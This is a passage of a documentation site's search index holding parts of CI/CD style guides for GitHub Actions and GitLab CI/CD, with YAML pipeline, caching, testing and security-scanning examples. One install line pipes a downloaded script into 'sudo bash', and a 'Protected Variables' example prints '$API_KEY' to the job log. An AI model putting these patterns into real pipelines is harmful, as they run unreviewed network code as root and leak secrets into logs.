.gitignore\nGITHUB_TOKEN=ghp_xxxxxxxxxxxxx\nAWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXXXX\nAWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxx\nNPM_TOKEN=npm_xxxxxxxxxxxxx\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#editorconfig","title":"EditorConfig","text":"<pre><code>## .editorconfig\n[.github/workflows/*.{yml,yaml}]\nindent_style = space\nindent_size = 2\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#yamllint-configuration","title":"yamllint Configuration","text":"<pre><code>## .yamllint\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 1\n  document-start: disable\n  truthy:\n    allowed-values: ['true', 'false', 'on', 'off']\n\nignore: |\n  node_modules/\n  .venv/\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#references","title":"References","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#official-documentation","title":"Official Documentation","text":"<ul> <li>GitHub Actions Documentation</li> <li>Workflow Syntax</li> <li>GitHub Actions Marketplace</li> </ul>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#security","title":"Security","text":"<ul> <li>Security Hardening</li> <li>Using Secrets</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/gitlab_ci/","title":"GitLab CI/CD Style Guide","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#language-overview","title":"Language Overview","text":"<p>GitLab CI/CD is a continuous integration and deployment tool built into GitLab. It uses <code>.gitlab-ci.yml</code> files to define pipelines that automatically build, test, and deploy code. This guide covers GitLab CI/CD best practices for creating maintainable, efficient pipelines.</p>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>File Name: <code>.gitlab-ci.yml</code></li> <li>Format: YAML</li> <li>Primary Use: CI/CD pipelines, automated testing, deployment automation</li> <li>Key Concepts: Pipelines, stages, jobs, runners, artifacts, cache</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes File Naming Pipeline Config <code>.gitlab-ci.yml</code> <code>.gitlab-ci.yml</code> At repository root Pipeline Structure <code>stages</code> Pipeline stages <code>stages: [build, test, deploy]</code> Ordered execution phases <code>image</code> Docker image <code>image: node:20-alpine</code> Default container image <code>before_script</code> Pre-job commands Setup commands Runs before each job <code>after_script</code> Post-job commands Cleanup commands Runs after each job Job Definition Job Name <code>job_name:</code> <code>build_app:</code> Descriptive job name <code>stage</code> Job stage <code>stage: build</code> Which stage job belongs to <code>script</code> Commands to run <code>script: - npm install</code> Required commands <code>only</code> / <code>except</code> Branch filters <code>only: [main]</code> When job runs (legacy) <code>rules</code> Conditional logic <code>rules: - if: $CI_COMMIT_BRANCH</code> Modern conditional execution Artifacts <code>artifacts</code> Save files <code>paths: [dist/]</code> Persist build outputs <code>expire_in</code> Artifact retention <code>expire_in: 1 week</code> Auto-cleanup <code>reports</code> Test reports <code>reports: junit: report.xml</code> Test result integration Cache <code>cache</code> Cache dependencies <code>paths: [node_modules/]</code> Speed up builds <code>key</code> Cache key <code>key: $CI_COMMIT_REF_SLUG</code> Cache versioning Variables Predefined <code>$CI_COMMIT_SHA</code> GitLab-provided variables Built-in vars Custom <code>variables:</code> <code>NODE_ENV: production</code> User-defined vars Protected Masked variables Secure secrets Settings &gt; CI/CD Best Practices Stages Logical grouping <code>[build, test, deploy]</code> Clear pipeline flow Docker Images Pin versions <code>node:20.10.0-alpine</code> Avoid <code>latest</code> Rules Use <code>rules:</code> Replace <code>only/except</code> Modern syntax Cache Speed up builds Cache dependencies Reduce build time","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#basic-pipeline-structure","title":"Basic Pipeline Structure","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#simple-pipeline","title":"Simple Pipeline","text":"<pre><code>stages:\n  - build\n  - test\n  - deploy\n\nvariables:\n  NODE_VERSION: \"18\"\n\nbuild_job:\n  stage: build\n  image: node:18-alpine\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths:\n      - dist/\n    expire_in: 1 day\n\ntest_job:\n  stage: test\n  image: node:18-alpine\n  script:\n    - npm ci\n    - npm test\n  coverage: '/Lines\\s*:\\s*(\\d+\\.\\d+)%/'\n\ndeploy_job:\n  stage: deploy\n  image: alpine:latest\n  script:\n    - echo \"Deploying to production\"\n    - ./deploy.sh\n  only:\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#stages","title":"Stages","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#define-stages","title":"Define Stages","text":"<pre><code>## Stages execute in order\nstages:\n  - build\n  - test\n  - package\n  - deploy\n  - cleanup\n\n## Jobs in same stage run in parallel\n## Jobs in next stage wait for previous stage to complete\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#jobs","title":"Jobs","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#job-configuration","title":"Job Configuration","text":"<pre><code>job_name:\n  stage: build\n  image: node:18-alpine\n  tags:\n    - docker\n  before_script:\n    - echo \"Preparing environment\"\n  script:\n    - npm ci\n    - npm run build\n  after_script:\n    - echo \"Cleaning up\"\n  only:\n    - main\n    - develop\n  except:\n    - tags\n  when: on_success\n  allow_failure: false\n  timeout: 1h\n  retry:\n    max: 2\n    when:\n      - runner_system_failure\n      - stuck_or_timeout_failure\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#variables","title":"Variables","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#global-variables","title":"Global Variables","text":"<pre><code>variables:\n  POSTGRES_DB: \"testdb\"\n  POSTGRES_USER: \"testuser\"\n  POSTGRES_PASSWORD: \"testpass\"\n  NODE_ENV: \"production\"\n  DOCKER_DRIVER: overlay2\n  GIT_STRATEGY: clone\n  GIT_DEPTH: \"50\"\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#job-variables","title":"Job Variables","text":"<pre><code>deploy_staging:\n  stage: deploy\n  variables:\n    DEPLOY_ENV: \"staging\"\n    API_URL: \"https://staging.example.com\"\n  script:\n    - echo \"Deploying to $DEPLOY_ENV\"\n    - ./deploy.sh\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#protected-variables","title":"Protected Variables","text":"<p>Set in GitLab UI under Settings &gt; CI/CD &gt; Variables:</p> <pre><code>deploy_production:\n  stage: deploy\n  script:\n    - echo \"API Key: $API_KEY\"  # From protected variable\n    - ./deploy.sh\n  only:\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#artifacts","title":"Artifacts","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#basic-artifacts","title":"Basic Artifacts","text":"<pre><code>build:\n  stage: build\n  script:\n    - npm run build\n  artifacts:\n    paths:\n      - dist/\n      - build/\n    expire_in: 1 week\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#artifact-with-reports","title":"Artifact with Reports","text":"<pre><code>test:\n  stage: test\n  script:\n    - npm test\n  artifacts:\n    when: always\n    reports:\n      junit: junit.xml\n      coverage_report:\n        coverage_format: cobertura\n        path: coverage/cobertura-coverage.xml\n    paths:\n      - coverage/\n    expire_in: 30 days\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#download-artifacts-from-another-job","title":"Download Artifacts from Another Job","text":"<pre><code>deploy:\n  stage: deploy\n  dependencies:\n    - build\n  script:\n    - ls dist/  # Artifacts from build job\n    - ./deploy.sh\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#cache","title":"Cache","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#npm-cache","title":"NPM Cache","text":"<pre><code>.node_cache: &amp;node_cache\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n      - .npm/\n\ntest:\n  &lt;&lt;: *node_cache\n  stage: test\n  script:\n    - npm ci --cache .npm\n    - npm test\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#global-cache","title":"Global Cache","text":"<pre><code>cache:\n  key: ${CI_COMMIT_REF_SLUG}\n  paths:\n    - node_modules/\n    - .npm/\n  policy: pull-push\n\nbuild:\n  stage: build\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n    policy: pull\n  script:\n    - npm ci\n    - npm run build\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#docker-in-docker-dind","title":"Docker-in-Docker (DinD)","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#building-docker-images","title":"Building Docker Images","text":"<pre><code>build_image:\n  stage: build\n  image: docker:latest\n  services:\n    - docker:dind\n  variables:\n    DOCKER_TLS_CERTDIR: \"/certs\"\n  before_script:\n    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY\n  script:\n    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .\n    - docker tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA $CI_REGISTRY_IMAGE:latest\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:latest\n  only:\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#conditional-execution","title":"Conditional Execution","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#onlyexcept","title":"Only/Except","text":"<pre><code>## Run only on specific branches\ndeploy_production:\n  stage: deploy\n  script:\n    - ./deploy-prod.sh\n  only:\n    - main\n\n## Run except on tags\ntest:\n  stage: test\n  script:\n    - npm test\n  except:\n    - tags\n\n## Run only on merge requests\nmr_check:\n  stage: test\n  script:\n    - npm run lint\n  only:\n    - merge_requests\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#rules-preferred","title":"Rules (Preferred)","text":"<pre><code>deploy:\n  stage: deploy\n  script:\n    - ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"main\"\n      when: always\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n      when: manual\n    - when: never\n\ntest:\n  stage: test\n  script:\n    - npm test\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n    - if: $CI_COMMIT_BRANCH == \"main\"\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#templates-and-includes","title":"Templates and Includes","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#include-external-files","title":"Include External Files","text":"<pre><code>include:\n  - local: '.gitlab/ci/build.yml'\n  - local: '.gitlab/ci/test.yml'\n  - local: '.gitlab/ci/deploy.yml'\n  - template: Security/SAST.gitlab-ci.yml\n  - remote: 'https://example.com/ci-templates/docker.yml'\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#anchor-and-aliases-yaml","title":"Anchor and Aliases (YAML)","text":"<pre><code>.job_template: &amp;job_definition\n  image: node:18-alpine\n  before_script:\n    - npm ci\n  retry:\n    max: 2\n\ntest:\n  &lt;&lt;: *job_definition\n  stage: test\n  script:\n    - npm test\n\nbuild:\n  &lt;&lt;: *job_definition\n  stage: build\n  script:\n    - npm run build\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#extends","title":"Extends","text":"<pre><code>.base_job:\n  image: node:18-alpine\n  before_script:\n    - npm ci\n  retry:\n    max: 2\n\ntest:\n  extends: .base_job\n  stage: test\n  script:\n    - npm test\n\nbuild:\n  extends: .base_job\n  stage: build\n  script:\n    - npm run build\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#parallel-jobs","title":"Parallel Jobs","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#matrix-jobs","title":"Matrix Jobs","text":"<pre><code>test:\n  stage: test\n  parallel:\n    matrix:\n      - NODE_VERSION: [\"16\", \"18\", \"20\"]\n        OS: [\"ubuntu-latest\", \"alpine\"]\n  image: node:${NODE_VERSION}-${OS}\n  script:\n    - npm ci\n    - npm test\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#simple-parallel","title":"Simple Parallel","text":"<pre><code>test:\n  stage: test\n  parallel: 3\n  script:\n    - npm test -- --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#services","title":"Services","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#postgresql-service","title":"PostgreSQL Service","text":"<pre><code>test:\n  stage: test\n  image: node:18-alpine\n  services:\n    - postgres:15-alpine\n  variables:\n    POSTGRES_DB: testdb\n    POSTGRES_USER: testuser\n    POSTGRES_PASSWORD: testpass\n    DATABASE_URL: \"postgresql://testuser:testpass@postgres:5432/testdb\"\n  script:\n    - npm ci\n    - npm run test:db\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#multiple-services","title":"Multiple Services","text":"<pre><code>integration_test:\n  stage: test\n  services:\n    - postgres:15-alpine\n    - redis:7-alpine\n  variables:\n    POSTGRES_DB: testdb\n    POSTGRES_PASSWORD: testpass\n    REDIS_URL: redis://redis:6379\n  script:\n    - npm run test:integration\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#multi-project-pipelines","title":"Multi-Project Pipelines","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#trigger-downstream-pipeline","title":"Trigger Downstream Pipeline","text":"<pre><code>trigger_deploy:\n  stage: deploy\n  trigger:\n    project: mygroup/deployment-project\n    branch: main\n    strategy: depend\n  only:\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#parent-child-pipelines","title":"Parent-Child Pipelines","text":"<pre><code>generate_child:\n  stage: build\n  script:\n    - echo \"Generating child pipeline config\"\n    - ./generate-pipeline.sh &gt; child-pipeline.yml\n  artifacts:\n    paths:\n      - child-pipeline.yml\n\ntrigger_child:\n  stage: deploy\n  trigger:\n    include:\n      - artifact: child-pipeline.yml\n        job: generate_child\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#complete-pipeline-example","title":"Complete Pipeline Example","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#full-stack-application-pipeline","title":"Full-Stack Application Pipeline","text":"<pre><code>workflow:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n    - if: $CI_COMMIT_BRANCH == \"main\"\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n\nstages:\n  - build\n  - test\n  - security\n  - package\n  - deploy\n\nvariables:\n  DOCKER_DRIVER: overlay2\n  POSTGRES_DB: testdb\n  POSTGRES_USER: testuser\n  POSTGRES_PASSWORD: testpass\n\n## Reusable templates\n.node_base:\n  image: node:18-alpine\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n      - .npm/\n  before_script:\n    - npm ci --cache .npm\n\n## Build stage\nbuild_frontend:\n  extends: .node_base\n  stage: build\n  script:\n    - cd frontend\n    - npm run build\n  artifacts:\n    paths:\n      - frontend/dist/\n    expire_in: 1 day\n\nbuild_backend:\n  extends: .node_base\n  stage: build\n  script:\n    - cd backend\n    - npm run build\n  artifacts:\n    paths:\n      - backend/dist/\n    expire_in: 1 day\n\n## Test stage\ntest_frontend:\n  extends: .node_base\n  stage: test\n  script:\n    - cd frontend\n    - npm test -- --coverage\n  coverage: '/Lines\\s*:\\s*(\\d+\\.\\d+)%/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: frontend/coverage/cobertura-coverage.xml\n    paths:\n      - frontend/coverage/\n    expire_in: 30 days\n\ntest_backend:\n  extends: .node_base\n  stage: test\n  services:\n    - postgres:15-alpine\n  variables:\n    DATABASE_URL: \"postgresql://testuser:testpass@postgres:5432/testdb\"\n  script:\n    - cd backend\n    - npm test -- --coverage\n  coverage: '/Lines\\s*:\\s*(\\d+\\.\\d+)%/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: backend/coverage/cobertura-coverage.xml\n\nlint:\n  extends: .node_base\n  stage: test\n  script:\n    - npm run lint\n\n## Security stage\nsast:\n  stage: security\n  allow_failure: true\n\ndependency_scanning:\n  stage: security\n  allow_failure: true\n\n## Package stage\nbuild_docker_images:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  variables:\n    DOCKER_TLS_CERTDIR: \"/certs\"\n  before_script:\n    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY\n  script:\n    - docker build -t $CI_REGISTRY_IMAGE/frontend:$CI_COMMIT_SHA frontend/\n    - docker build -t $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHA backend/\n    - docker push $CI_REGISTRY_IMAGE/frontend:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHA\n  only:\n    - main\n    - develop\n\n## Deploy stage\ndeploy_staging:\n  stage: deploy\n  image: alpine:latest\n  before_script:\n    - apk add --no-cache curl\n  script:\n    - echo \"Deploying to staging\"\n    - ./deploy-staging.sh\n  environment:\n    name: staging\n    url: https://staging.example.com\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n\ndeploy_production:\n  stage: deploy\n  image: alpine:latest\n  before_script:\n    - apk add --no-cache curl\n  script:\n    - echo \"Deploying to production\"\n    - ./deploy-production.sh\n  environment:\n    name: production\n    url: https://example.com\n  when: manual\n  only:\n    - main\n\ninclude:\n  - template: Security/SAST.gitlab-ci.yml\n  - template: Security/Dependency-Scanning.gitlab-ci.yml\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#testing","title":"Testing","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#testing-pipelines-locally","title":"Testing Pipelines Locally","text":"<p>Use GitLab Runner to test pipelines locally before committing:</p> <pre><code>## Install GitLab Runner\n# macOS\nbrew install gitlab-runner\n\n# Linux\ncurl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh | sudo bash\nsudo apt-get install gitlab-runner\n\n## Test pipeline locally\ngitlab-runner exec docker test\n\n## Test specific job\ngitlab-runner exec docker build\n\n## Test with specific Docker image\ngitlab-runner exec docker --docker-image node:18-alpine test\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#validating-ci-configuration","title":"Validating CI Configuration","text":"<p>Validate <code>.gitlab-ci.yml</code> syntax:</p> <pre><code>## Using GitLab CI Lint API\ncurl --header \"PRIVATE-TOKEN: &lt;your_access_token&gt;\" \\\n     --header \"Content-Type: application/json\" \\\n     --data @.gitlab-ci.yml \\\n     \"https://gitlab.com/api/v4/projects/&lt;project_id&gt;/ci/lint\"\n\n## Using gitlab-ci-lint tool\nnpm install -g gitlab-ci-lint\ngitlab-ci-lint .gitlab-ci.yml\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#pipeline-testing-job","title":"Pipeline Testing Job","text":"<p>Add pipeline validation as a job:</p> <pre><code>## .gitlab-ci.yml\nstages:\n  - validate\n  - test\n  - build\n  - deploy\n\nvalidate:pipeline:\n  stage: validate\n  image: alpine:latest\n  before_script:\n    - apk add --no-cache yamllint\n  script:\n    - yamllint .gitlab-ci.yml\n    - echo \"Pipeline configuration is valid\"\n  only:\n    changes:\n      - .gitlab-ci.yml\n\nvalidate:dockerfile:\n  stage: validate\n  image: hadolint/hadolint:latest-alpine\n  script:\n    - hadolint Dockerfile\n  only:\n    changes:\n      - Dockerfile\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#unit-testing-in-ci","title":"Unit Testing in CI","text":"<pre><code>test:unit:\n  stage: test\n  image: node:18-alpine\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n  before_script:\n    - npm ci\n  script:\n    - npm run test:unit\n  coverage: '/All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/'\n  artifacts:\n    when: always\n    reports:\n      junit: junit.xml\n      coverage_report:\n        coverage_format: cobertura\n        path: coverage/cobertura-coverage.xml\n    paths:\n      - coverage/\n    expire_in: 30 days\n  only:\n    - merge_requests\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#integration-testing","title":"Integration Testing","text":"<pre><code>test:integration:\n  stage: test\n  image: node:18-alpine\n  services:\n    - name: postgres:15-alpine\n      alias: postgres\n  variables:\n    POSTGRES_DB: test_db\n    POSTGRES_USER: test_user\n    POSTGRES_PASSWORD: test_pass\n    DATABASE_URL: postgresql://test_user:test_pass@postgres:5432/test_db\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n  before_script:\n    - npm ci\n  script:\n    - npm run test:integration\n  artifacts:\n    when: always\n    reports:\n      junit: integration-test-results.xml\n    expire_in: 7 days\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#end-to-end-testing","title":"End-to-End Testing","text":"<pre><code>test:e2e:\n  stage: test\n  image: mcr.microsoft.com/playwright:latest\n  services:\n    - name: selenium/standalone-chrome:latest\n      alias: chrome\n  variables:\n    SELENIUM_HOST: chrome\n    SELENIUM_PORT: 4444\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n      - playwright/.cache\n  before_script:\n    - npm ci\n    - npx playwright install\n  script:\n    - npm run test:e2e\n  artifacts:\n    when: always\n    paths:\n      - test-results/\n      - playwright-report/\n    expire_in: 7 days\n  only:\n    - merge_requests\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#security-testing","title":"Security Testing","text":"<pre><code>## SAST (Static Application Security Testing)\ninclude:\n  - template: Security/SAST.gitlab-ci.yml\n  - template: Security/Dependency-Scanning.gitlab-ci.yml\n  - template: Security/Secret-Detection.gitlab-ci.yml\n\n## Container Scanning\ncontainer_scanning:\n  stage: test\n  image: docker:latest\n  services:\n    - docker:dind\n  variables:\n    DOCKER_DRIVER: overlay2\n    CI_APPLICATION_REPOSITORY: $CI_REGISTRY_IMAGE\n    CI_APPLICATION_TAG: $CI_COMMIT_SHA\n  script:\n    - docker build -t $CI_APPLICATION_REPOSITORY:$CI_APPLICATION_TAG .\n    - |\n      docker run --rm \\\n        -v /var/run/docker.sock:/var/run/docker.sock \\\n        aquasec/trivy:latest \\\n        image --exit-code 1 --severity HIGH,CRITICAL \\\n        $CI_APPLICATION_REPOSITORY:$CI_APPLICATION_TAG\n  only:\n    - merge_requests\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#performance-testing","title":"Performance Testing","text":"<pre><code>test:performance:\n  stage: test\n  image: grafana/k6:latest\n  script:\n    - k6 run --vus 10 --duration 30s tests/load-test.js\n  artifacts:\n    reports:\n      load_performance: k6-results.json\n    paths:\n      - k6-results.json\n    expire_in: 7 days\n  only:\n    - schedules\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#parallel-testing","title":"Parallel Testing","text":"<p>Speed up tests with parallel execution:</p> <pre><code>test:unit:parallel:\n  stage: test\n  image: node:18-alpine\n  parallel: 4\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n  before_script:\n    - npm ci\n  script:\n    - npm run test:unit -- --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL\n  artifacts:\n    when: always\n    reports:\n      junit: junit-shard-${CI_NODE_INDEX}.xml\n    expire_in: 7 days\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#test-coverage-reporting","title":"Test Coverage Reporting","text":"<pre><code>test:coverage:\n  stage: test\n  image: node:18-alpine\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n  before_script:\n    - npm ci\n  script:\n    - npm run test:coverage\n  coverage: '/All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: coverage/cobertura-coverage.xml\n    paths:\n      - coverage/\n    expire_in: 30 days\n\n## Enforce coverage threshold\ncheck:coverage:\n  stage: test\n  image: node:18-alpine\n  needs: [test:coverage]\n  script:\n    - |\n      COVERAGE=$(cat coverage/coverage-summary.json | jq '.total.lines.pct')\n      echo \"Coverage: $COVERAGE%\"\n      if (( $(echo \"$COVERAGE &lt; 80\" | bc -l) )); then\n        echo \"Coverage below 80% threshold\"\n        exit 1\n      fi\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#review-apps-testing","title":"Review Apps Testing","text":"<p>Test in ephemeral environments:</p> <pre><code>review:deploy:\n  stage: deploy\n  image: alpine:latest\n  script:\n    - echo \"Deploying review app...\"\n    - echo \"Review app URL: https://review-$CI_COMMIT_REF_SLUG.example.com\"\n  environment:\n    name: review/$CI_COMMIT_REF_SLUG\n    url: https://review-$CI_COMMIT_REF_SLUG.example.com\n    on_stop: review:stop\n  only:\n    - merge_requests\n\nreview:test:\n  stage: test\n  needs: [review:deploy]\n  image: curlimages/curl:latest\n  script:\n    - curl -f https://review-$CI_COMMIT_REF_SLUG.example.com/health\n    - echo \"Review app health check passed\"\n  only:\n    - merge_requests\n\nreview:stop:\n  stage: deploy\n  image: alpine:latest\n  script:\n    - echo \"Destroying review app...\"\n  environment:\n    name: review/$CI_COMMIT_REF_SLUG\n    action: stop\n  when: manual\n  only:\n    - merge_requests\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#testing-with-child-pipelines","title":"Testing with Child Pipelines","text":"<p>Organize tests using child pipelines:</p> <pre><code>## .gitlab-ci.yml\ntrigger:tests:\n  stage: test\n  trigger:\n    include: .gitlab/ci/tests.yml\n    strategy: depend\n\n## .gitlab/ci/tests.yml\nstages:\n  - unit\n  - integration\n  - e2e\n\nunit:tests:\n  stage: unit\n  image: node:18-alpine\n  script:\n    - npm ci\n    - npm run test:unit\n\nintegration:tests:\n  stage: integration\n  image: node:18-alpine\n  services:\n    - postgres:15-alpine\n  script:\n    - npm ci\n    - npm run test:integration\n\ne2e:tests:\n  stage: e2e\n  image: mcr.microsoft.com/playwright:latest\n  script:\n    - npm ci\n    - npx playwright install\n    - npm run test:e2e\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#conditional-testing","title":"Conditional Testing","text":"<p>Run tests based on changes:</p> <pre><code>test:backend:\n  stage: test\n  